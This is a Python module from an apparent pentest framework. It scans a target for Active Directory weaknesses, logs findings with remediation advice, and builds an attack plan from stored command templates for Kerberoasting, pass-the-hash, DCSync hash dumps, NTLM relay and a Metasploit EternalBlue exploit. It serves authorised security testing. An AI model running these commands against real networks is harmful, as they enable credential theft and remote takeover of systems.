"""
AD Attack Module — Active Directory attack chain + LDAP/Kerberos/MS17-010/BloodHound.
"""

import asyncio
import socket
import subprocess
import struct
import json
import os
from core.orchestrator import EngagementState, Finding, Severity

AD_ATTACK_CHAINS = {
    "kerberoasting": {
        "tactic": "Credential Access",
        "technique": "T1558.003 - Kerberoasting",
        "description": "Request TGS tickets for SPNs, crack offline",
        "tools": ["impacket-GetUserSPNs", "Rubeus"],
        "commands": [
            "impacket-GetUserSPNs {domain}/{user}:{pass} -dc-ip {dc_ip} -request",
            "hashcat -m 13100 hashes.txt wordlist.txt",
        ],
        "prerequisites": ["Valid domain credentials"],
        "severity": Severity.HIGH,
    },
    "asrep_roasting": {
        "tactic": "Credential Access",
        "technique": "T1558.004 - AS-REP Roasting",
        "description": "Target accounts with pre-auth disabled",
        "tools": ["impacket-GetNPUsers"],
        "commands": [
            "impacket-GetNPUsers {domain}/ -dc-ip {dc_ip} -usersfile users.txt -no-pass -format hashcat",
        ],
        "prerequisites": ["List of usernames (or anonymous LDAP)"],
        "severity": Severity.HIGH,
    },
    "pass_the_hash": {
        "tactic": "Lateral Movement",
        "technique": "T1550.002 - Pass the Hash",
        "description": "Use NTLM hash without cracking",
        "tools": ["impacket-psexec", "crackmapexec", "Evil-WinRM"],
        "commands": [
            "impacket-psexec {domain}/{user}@{target} -hashes :{ntlm_hash}",
            "crackmapexec smb {target} -u {user} -H {ntlm_hash}",
            "evil-winrm -i {target} -u {user} -H {ntlm_hash}",
        ],
        "prerequisites": ["NTLM hash (from secretsdump or mimikatz)"],
        "severity": Severity.CRITICAL,
    },
    "dcsync": {
        "tactic": "Credential Access",
        "technique": "T1003.006 - DCSync",
        "description": "Replicate DC credentials using DS-Replication rights",
        "tools": ["impacket-secretsdump"],
        "commands": [
            "impacket-secretsdump {domain}/{user}:{pass}@{dc_ip}",
            "impacket-secretsdump -just-dc-ntlm {domain}/{user}:{pass}@{dc_ip}",
        ],
        "prerequisites": ["Replicating Directory Changes permission (Domain Admin or delegated)"],
        "severity": Severity.CRITICAL,
    },
    "ntlmrelayx": {
        "tactic": "Credential Access",
        "technique": "T1557.001 - LLMNR/NBT-NS Poisoning and SMB Relay",
        "description": "Relay NTLM auth to other services when SMB signing is disabled",
        "tools": ["impacket-ntlmrelayx", "Responder"],
        "commands": [
            "python Responder.py -I eth0 -rdw",
            "impacket-ntlmrelayx -tf targets.txt -smb2support",
            "impacket-ntlmrelayx -tf targets.txt -smb2support -i",
        ],
        "prerequisites": ["SMB signing disabled on targets", "Network position for LLMNR poisoning"],
        "severity": Severity.CRITICAL,
    },
    "smb_enum": {
        "tactic": "Discovery",
        "technique": "T1135 - Network Share Discovery",
        "description": "Enumerate SMB shares and permissions",
        "tools": ["crackmapexec", "smbclient"],
        "commands": [
            "crackmapexec smb {target} -u {user} -p {pass} --shares",
            "impacket-smbclient {domain}/{user}:{pass}@{target}",
        ],
        "prerequisites": ["Any domain credentials"],
        "severity": Severity.MEDIUM,
    },
    "ldap_enum": {
        "tactic": "Discovery",
        "technique": "T1018 - Remote System Discovery",
        "description": "Enumerate AD objects via LDAP",
        "tools": ["ldapsearch", "bloodhound-python"],
        "commands": [
            "bloodhound-python -u {user} -p {pass} -d {domain} -dc {dc_ip} -c All",
            "ldapsearch -x -H ldap://{dc_ip} -D '{user}@{domain}' -w {pass} -b 'DC={domain_parts}' '(objectClass=user)'",
        ],
        "prerequisites": ["Valid domain credentials"],
        "severity": Severity.MEDIUM,
    },
    "ldap_anonymous": {
        "tactic": "Discovery",
        "technique": "T1087.002 - Account Discovery: Domain Account",
        "description": "Anonymous LDAP bind to enumerate AD objects without credentials",
        "tools": ["ldapsearch", "windapsearch"],
        "commands": [
            "ldapsearch -x -H ldap://{dc_ip} -b '' -s base '(objectClass=*)' namingContexts",
            "ldapsearch -x -H ldap://{dc_ip} -b 'DC={domain_parts}' '(objectClass=user)' sAMAccountName",
            "python windapsearch.py -d {domain} -u '' --dc-ip {dc_ip} -U",
        ],
        "prerequisites": ["Anonymous LDAP bind enabled (misconfiguration)"],
        "severity": Severity.HIGH,
    },
    "ms17_010": {
        "tactic": "Lateral Movement",
        "technique": "T1210 - Exploitation of Remote Services",
        "description": "EternalBlue SMB exploit (MS17-010) — RCE without auth",
        "tools": ["Metasploit", "AutoBlue-MS17-010"],
        "commands": [
            "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {target}; run'",
            "python send_and_execute.py {target} payload.exe",
        ],
        "prerequisites": ["Port 445 open", "SMBv1 enabled (Windows 7/2008R2 or unpatched later)"],
        "severity": Severity.CRITICAL,
    },
    "kerberos_preauth_enum": {
        "tactic": "Reconnaissance",
        "technique": "T1558.004 - AS-REP Roasting",
        "description": "Enumerate Kerberos pre-auth via raw socket (no impacket)",
        "tools": ["custom_script"],
        "commands": [
            "python kerbrute.py userenum --dc {dc_ip} -d {domain} users.txt",
            "# Raw socket AS-REQ probe on port 88",
        ],
        "prerequisites": ["Port 88 open", "Username wordlist"],
        "severity": Severity.MEDIUM,
    },
}


def check_smb_signing(target: str) -> dict:
    result = {"required": None, "enabled": None, "error": None}
    try:
        proc = subprocess.run(
            ["crackmapexec", "smb", target],
            capture_output=True, text=True, timeout=10
        )
        output = proc.stdout + proc.stderr
        if "signing:True" in output or "signing: True" in output:
            result["required"] = True
        elif "signing:False" in output or "signing: False" in output:
            result["required"] = False
    except FileNotFoundError:
        result["error"] = "crackmapexec not found"
    except Exception as e:
        result["error"] = str(e)
    return result


def check_ldap_anonymous_bind(target: str) -> dict:
    """Check for LDAP anonymous bind using ldap3."""
    result = {"anonymous_bind": False, "naming_contexts": [], "error": None}
    try:
        import ldap3
        server = ldap3.Server(target, port=389, get_info=ldap3.ALL, connect_timeout=5)
        conn = ldap3.Connection(server, auto_bind=False)
        conn.open()
        if conn.bind():
            result["anonymous_bind"] = True
            if server.info and server.info.naming_contexts:
                result["naming_contexts"] = list(server.info.naming_contexts)
        conn.unbind()
    except ImportError:
        result["error"] = "ldap3 not installed"
    except Exception as e:
        result["error"] = str(e)
    return result


def check_smb_null_session(target: str) -> dict:
    """Check for SMB null session (anonymous share access)."""
    result = {"null_session": False, "error": None}
    try:
        proc = subprocess.run(
            ["smbclient", "-L", target, "-N"],
            capture_output=True, text=True, timeout=10
        )
        output = proc.stdout + proc.stderr
        if "Sharename" in output or "Domain=" in output:
            result["null_session"] = True
        elif "NT_STATUS_ACCESS_DENIED" in output:
            result["null_session"] = False
        else:
            result["null_session"] = False
    except FileNotFoundError:
        result["error"] = "smbclient not found"
    except Exception as e:
        result["error"] = str(e)
    return result


def check_ms17_010(target: str) -> dict:
    """Fingerprint MS17-010 (EternalBlue) via SMB negotiation — raw socket."""
    result = {"vulnerable": False, "os_guess": None, "error": None}
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((target, 445))

        # SMB negotiate request (minimal)
        smb_negotiate = (
            b"\x00\x00\x00\x85"  # NetBIOS session
            b"\xff\x53\x4d\x42"  # SMB magic
            b"\x72\x00\x00\x00"  # Negotiate protocol
            b"\x00\x18\x53\xc8"
            b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xfe"
            b"\x00\x00\x00\x00\x00\x62\x00\x02\x50\x43\x20\x4e\x45\x54"
            b"\x57\x4f\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31"
            b"\x2e\x30\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00"
            b"\x02\x57\x69\x6e\x64\x6f\x77\x73\x20\x66\x6f\x72\x20\x57"
            b"\x6f\x72\x6b\x67\x72\x6f\x75\x70\x73\x20\x33\x2e\x31\x61"
            b"\x00\x02\x4c\x4d\x31\x2e\x32\x58\x30\x30\x32\x00\x02\x4c"
            b"\x41\x4e\x4d\x41\x4e\x32\x2e\x31\x00\x02\x4e\x54\x20\x4c"
            b"\x4d\x20\x30\x2e\x31\x32\x00"
        )
        sock.send(smb_negotiate)
        resp = sock.recv(1024)
        sock.close()

        if resp and len(resp) > 36:
            # Check for SMBv1 support in response
            if resp[4:8] == b"\xff\x53\x4d\x42":
                result["vulnerable"] = True
                # Try to extract OS string (bytes after fixed header)
                try:
                    os_offset = resp.find(b"Windows")
                    if os_offset > 0:
                        result["os_guess"] = resp[os_offset:os_offset+30].decode("utf-8", errors="ignore")
                except Exception:
                    pass

    except Exception as e:
        result["error"] = str(e)
    return result


def check_kerberos_preauth(target: str) -> dict:
    """Test Kerberos port availability via raw socket."""
    result = {"port_open": False, "error": None}
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        r = sock.connect_ex((target, 88))
        sock.close()
        result["port_open"] = (r == 0)
    except Exception as e:
        result["error"] = str(e)
    return result


def check_bloodhound_json(target: str) -> dict:
    """Check if bloodhound.json exists in current directory and parse it."""
    result = {"found": False, "data": {}, "error": None}
    bh_paths = [
        "bloodhound.json",
        os.path.join(os.getcwd(), "bloodhound.json"),
        os.path.join(os.getcwd(), "BloodHound.json"),
    ]
    for path in bh_paths:
        if os.path.isfile(path):
            try:
                with open(path, "r", encoding="utf-8") as f:
                    data = json.load(f)
                result["found"] = True
                result["path"] = path
                result["data"] = {
                    "meta": data.get("meta", {}),
                    "computers": len(data.get("computers", {}).get("data", [])),
                    "users": len(data.get("users", {}).get("data", [])),
                    "groups": len(data.get("groups", {}).get("data", [])),
                }
                break
            except Exception as e:
                result["error"] = str(e)
    return result


def check_ports_for_ad(target: str) -> dict:
    ad_ports = {
        88: "Kerberos", 135: "RPC", 139: "NetBIOS", 389: "LDAP",
        445: "SMB", 464: "Kpasswd", 593: "RPC-HTTP", 636: "LDAPS",
        3268: "GC-LDAP", 3269: "GC-LDAPS", 5985: "WinRM-HTTP", 5986: "WinRM-HTTPS",
    }
    open_ad_ports = {}
    for port, name in ad_ports.items():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1.5)
            result = sock.connect_ex((target, port))
            sock.close()
            if result == 0:
                open_ad_ports[port] = name
        except Exception:
            pass
    return open_ad_ports


def generate_attack_plan(open_ports: dict, mode: str, smb_signing_required: bool = True,
                          anonymous_ldap: bool = False) -> list:
    plan = []
    port_nums = list(open_ports.keys())
    step = 1

    if 389 in port_nums or 636 in port_nums:
        if anonymous_ldap:
            plan.append({
                "step": step, "name": "Anonymous LDAP Enumeration",
                "chain": "ldap_anonymous",
                "reason": "LDAP anonymous bind enabled — enumerate users/groups without credentials",
            })
            step += 1
        plan.append({
            "step": step, "name": "LDAP Enumeration (authenticated)",
            "chain": "ldap_enum",
            "reason": "LDAP port open — enumerate users, groups, SPNs",
        })
        step += 1

    if 88 in port_nums:
        plan.append({
            "step": step, "name": "Kerberos Pre-auth Enumeration",
            "chain": "kerberos_preauth_enum",
            "reason": "Kerberos port open — enumerate valid usernames",
        })
        step += 1
        plan.append({
            "step": step, "name": "AS-REP Roasting",
            "chain": "asrep_roasting",
            "reason": "Kerberos port open — test for pre-auth disabled accounts",
        })
        step += 1
        plan.append({
            "step": step, "name": "Kerberoasting",
            "chain": "kerberoasting",
            "reason": "Kerberos port open — find service accounts with weak passwords",
        })
        step += 1

    if 445 in port_nums:
        plan.append({
            "step": step, "name": "SMB Enumeration",
            "chain": "smb_enum",
            "reason": "SMB port open — check shares, credentials, relay attack surface",
        })
        step += 1
        if not smb_signing_required:
            plan.append({
                "step": step, "name": "NTLM Relay (ntlmrelayx)",
                "chain": "ntlmrelayx",
                "reason": "SMB signing disabled — NTLM relay attacks are possible",
            })
            step += 1

    if mode == "redteam":
        plan.append({
            "step": step, "name": "Pass-the-Hash",
            "chain": "pass_the_hash",
            "reason": "Red team: lateral movement after initial credential access",
        })
        step += 1
        plan.append({
            "step": step, "name": "DCSync",
            "chain": "dcsync",
            "reason": "Red team: domain dominance — dump all hashes",
        })

    return plan


async def run_ad_analysis(state: EngagementState, console=None) -> dict:
    target = state.target

    def log(msg):
        if console:
            console.print(f"  [dim]→[/dim] {msg}")

    log(f"Scanning AD-related ports on {target}...")
    open_ad_ports = await asyncio.get_event_loop().run_in_executor(
        None, check_ports_for_ad, target
    )

    if not open_ad_ports:
        state.add_note("No AD ports detected — target may not be a Domain Controller")
        return {"ad_detected": False}

    log(f"AD ports found: {', '.join(f'{p}/{n}' for p, n in open_ad_ports.items())}")

    # ── SMB signing check ─────────────────────────────────────────────────────
    smb_signing = {}
    smb_signing_required = True
    if 445 in open_ad_ports:
        log("Checking SMB signing...")
        smb_signing = await asyncio.get_event_loop().run_in_executor(None, check_smb_signing, target)
        smb_signing_required = smb_signing.get("required", True) is not False

        if smb_signing.get("required") is False:
            state.add_finding(Finding(
                title="SMB signing NOT required — NTLM relay possible",
                severity=Severity.CRITICAL,
                description="SMB signing disabled. Responder + ntlmrelayx attacks possible.",
                evidence=f"crackmapexec shows signing:False on {target}",
                mitre_tactic="Credential Access",
                mitre_technique="T1557.001 - LLMNR/NBT-NS Poisoning and SMB Relay",
                remediation="Enable 'Microsoft network server: Digitally sign communications (always)' GPO.",
                cvss=8.1, phase="ad",
            ))

        # SMB null session
        log("Checking SMB null session...")
        null_session = await asyncio.get_event_loop().run_in_executor(None, check_smb_null_session, target)
        if null_session.get("null_session"):
            state.add_finding(Finding(
                title="SMB null session allowed",
                severity=Severity.HIGH,
                description="Anonymous SMB connection accepted. Share enumeration possible without credentials.",
                evidence=f"smbclient -L {target} -N returned share listing",
                mitre_tactic="Discovery",
                mitre_technique="T1135 - Network Share Discovery",
                remediation="Disable anonymous access to IPC$ and restrict null sessions via GPO.",
                cvss=7.5, phase="ad",
            ))

        # MS17-010 fingerprint
        log("Fingerprinting MS17-010 (EternalBlue)...")
        ms17 = await asyncio.get_event_loop().run_in_executor(None, check_ms17_010, target)
        if ms17.get("vulnerable"):
            state.add_finding(Finding(
                title="MS17-010 (EternalBlue) — potentially vulnerable",
                severity=Severity.CRITICAL,
                description="SMBv1 support detected. Host may be vulnerable to EternalBlue RCE.",
                evidence=f"SMBv1 negotiate response received. OS guess: {ms17.get('os_guess', 'Unknown')}",
                mitre_tactic="Lateral Movement",
                mitre_technique="T1210 - Exploitation of Remote Services",
                remediation="Disable SMBv1 via PowerShell: Set-SmbServerConfiguration -EnableSMB1Protocol $false. Apply MS17-010 patch.",
                cvss=9.8, phase="ad",
            ))

    # ── LDAP anonymous bind ───────────────────────────────────────────────────
    anonymous_ldap = False
    ldap_result = {}
    if 389 in open_ad_ports:
        log("Checking LDAP anonymous bind...")
        ldap_result = await asyncio.get_event_loop().run_in_executor(None, check_ldap_anonymous_bind, target)
        anonymous_ldap = ldap_result.get("anonymous_bind", False)
        if anonymous_ldap:
            state.add_finding(Finding(
                title="LDAP anonymous bind enabled",
                severity=Severity.HIGH,
                description="Anonymous LDAP bind accepted. AD objects can be enumerated without credentials.",
                evidence=f"Naming contexts: {', '.join(ldap_result.get('naming_contexts', []))}",
                mitre_tactic="Discovery",
                mitre_technique="T1087.002 - Account Discovery: Domain Account",
                remediation="Disable anonymous LDAP bind via 'dSHeuristics' attribute or group policy.",
                cvss=7.5, phase="ad",
            ))
        else:
            state.add_finding(Finding(
                title="LDAP exposed — AD enumeration possible",
                severity=Severity.HIGH,
                description="LDAP port open. Authenticated enumeration of AD objects possible.",
                evidence=f"Port 389 open on {target}",
                mitre_tactic="Discovery",
                mitre_technique="T1018 - Remote System Discovery",
                remediation="Restrict LDAP access. Disable anonymous LDAP bind.",
                phase="ad",
            ))

    # ── Kerberos pre-auth ─────────────────────────────────────────────────────
    kerberos_info = {}
    if 88 in open_ad_ports:
        log("Checking Kerberos port...")
        kerberos_info = await asyncio.get_event_loop().run_in_executor(None, check_kerberos_preauth, target)

    # ── BloodHound JSON import ────────────────────────────────────────────────
    bh_result = check_bloodhound_json(target)
    if bh_result.get("found"):
        log(f"BloodHound JSON found: {bh_result.get('path')}")
        state.add_finding(Finding(
            title="BloodHound data found — attack paths available",
            severity=Severity.INFO,
            description=f"BloodHound JSON imported: {bh_result['data']}",
            evidence=f"File: {bh_result.get('path')}",
            mitre_tactic="Discovery",
            mitre_technique="T1069.002 - Domain Groups",
            phase="ad",
        ))

    # ── WinRM findings ────────────────────────────────────────────────────────
    if 5985 in open_ad_ports or 5986 in open_ad_ports:
        state.add_finding(Finding(
            title="WinRM exposed — remote management possible",
            severity=Severity.HIGH,
            description="Windows Remote Management port open. Evil-WinRM or pass-the-hash possible.",
            evidence=f"Port {'5985' if 5985 in open_ad_ports else '5986'} open",
            mitre_tactic="Lateral Movement",
            mitre_technique="T1021.006 - Remote Services: Windows Remote Management",
            remediation="Restrict WinRM to management IPs only.",
            phase="ad",
        ))

    # ── Attack plan ───────────────────────────────────────────────────────────
    attack_plan = generate_attack_plan(
        open_ad_ports, state.mode.value,
        smb_signing_required=smb_signing_required,
        anonymous_ldap=anonymous_ldap,
    )

    ad_data = {
        "ad_detected": True,
        "open_ad_ports": open_ad_ports,
        "smb_signing": smb_signing,
        "ldap_result": ldap_result,
        "kerberos_info": kerberos_info,
        "bloodhound": bh_result,
        "attack_plan": attack_plan,
        "attack_chains": {
            k: {
                "tactic": v["tactic"],
                "technique": v["technique"],
                "description": v["description"],
                "tools": v["tools"],
                "commands": v["commands"],
                "prerequisites": v["prerequisites"],
            }
            for k, v in AD_ATTACK_CHAINS.items()
            if any(step["chain"] == k for step in attack_plan)
        },
    }

    state.ad_data = ad_data
    state.add_note(f"AD analysis: {len(open_ad_ports)} AD ports, {len(attack_plan)} attack steps")
    return ad_data
